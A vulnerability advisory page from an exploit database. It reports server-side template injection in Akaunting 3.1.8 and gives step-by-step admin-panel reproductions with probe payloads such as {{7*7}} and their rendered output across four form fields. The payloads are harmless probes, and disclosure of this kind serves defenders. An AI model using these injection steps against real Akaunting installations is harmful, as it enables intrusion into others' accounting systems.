---
title: Akaunting 3.1.8 Server-Side Template Injection
url: https://cxsecurity.com/issue/WLB-2024060004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-03
fetch_date: 2025-10-06T17:31:42.125791
---

# Akaunting 3.1.8 Server-Side Template Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Akaunting 3.1.8 Server-Side Template Injection** **2024.06.02**  Credit:  **[tmrswrr](https://cxsecurity.com/author/tmrswrr/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Akaunting 3.1.8 - Server-Side Template Injection (SSTI)
# Exploit Author: tmrswrr
# Date: 30/05/2024
# Vendor: https://akaunting.com/forum
# Software Link: https://akaunting.com/apps/crm
# Vulnerable Version(s): 3.1.8
# Tested : https://www.softaculous.com/apps/erp/Akaunting
1 ) Login with admin cred and go to : Items > New Item
https://127.0.0.1/Akaunting/1/common/items
2 ) Write SSTI payload : {{7\*7}} Name field , write Sale and Purchase Price random numbers
3 ) Save it
4 ) You will be see result :
49
====================================================================================
1 ) Login with admin cred and go to :Settings > Taxes > New Tax
https://127.0.0.1/Akaunting/1/settings/taxes/1/edit
2 ) Write SSTI payload : {{7\*7}} Name field , write Sale and Purchase Price random numbers
3 ) Save it
4 ) You will be see result :
49
> {{'a'.toUpperCase()}}
> A
> {{'a'.concat('b')}}
> ab
====================================================================================
1 ) Login with admin cred and go to : Banking > Transactions > New Income
https://127.0.0.1/Akaunting/1/banking/transactions/create?type=income
2 ) Write SSTI payload : {{7\*7}} Description field
3 ) Save it
4 ) You will be see result :
49
> {{'a'.toUpperCase()}}
> A
> {{'a'.concat('b')}}
> ab
=======================================================================================
1 ) Login with admin cred
https://127.0.0.1/Akaunting/1/purchases/vendors/1/edit
2 ) Write SSTI payload : {{7\*7}} Name field
3 ) Save it
4 ) You will be see result :
49
> {{'a'.toUpperCase()}}
> A
> {{'a'.concat('b')}}
> ab

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top